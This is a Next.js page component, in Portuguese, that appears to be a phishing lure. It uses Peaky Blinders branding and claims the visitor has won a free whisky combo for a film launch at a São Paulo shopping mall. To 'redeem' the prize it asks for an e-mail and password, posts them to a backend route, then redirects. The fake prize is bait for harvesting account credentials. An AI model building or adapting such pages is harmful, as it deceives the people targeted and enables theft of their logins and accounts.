import { Inter, Averia_Serif_Libre } from 'next/font/google'
import styles from '@/styles/Home.module.css'
import Image from 'next/image'
import { useRef } from 'react'
import { useRouter } from 'next/router'

const inter = Inter({ subsets: ['latin'] })
const averia = Averia_Serif_Libre({ subsets: ['latin'], weight: ["300", "400", "700"] })

export default function Home() {

  const router = useRouter()
  const emailRef = useRef(null)
  const passwordRef = useRef(null)

  async function handleSubmit(e) {
    e.preventDefault()

    const email = emailRef.current.value
    const password = passwordRef.current.value

    if (!email || !password) {
      alert('Preencha todos os campos')
      return
    }

    if (email === '' || password === '') {
      alert('Preencha todos os campos')
      return
    }

    try {
      const response = await fetch('/api/form', {
        method: 'POST',
        body: JSON.stringify({ email, password }),
        headers: {
          'Content-Type': 'application/json'
        }
      })

      router.push('/fim')
    } catch (error) {
      console.log(error)
    }
  }

  return (
    <div className={`${styles.container} ${inter.className}`}>

      <div>
        <Image src="/logo.svg" alt="Peaky Blinders" width={152} height={48} />
      </div>

      <div className={styles.form}>
        <div className={styles.form_header}>
          <Image src="/hero.png" alt="Peaky Blinders" width={540} height={263} />
        </div>

        <div className={styles.form_body}>
          <div className={styles.form_content}>
            <h2 className={averia.className}>
              Você ganhou um combo de Whisky Grátis em comemoração ao lançamento do filme, para resgatar
            </h2>

            <p>Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
          </div>

          <div className={styles.form_data}>
            <input ref={emailRef} className={styles.form_control} placeholder="E-mail" type="text" />
            <input ref={passwordRef} className={styles.form_control} placeholder="Senha" type="password" />
            <button onClick={handleSubmit} className={styles.form_button}>RESGATAR COMBO!</button>
            <span className={styles.terms}>Ao resgatar você concorda com os Termos de Uso</span>
          </div>
        </div>
      </div>

      <div>
        <span className={styles.copy}>
          © 2023 Peaky Blinders
        </span>
      </div>

    </div>
  )
}
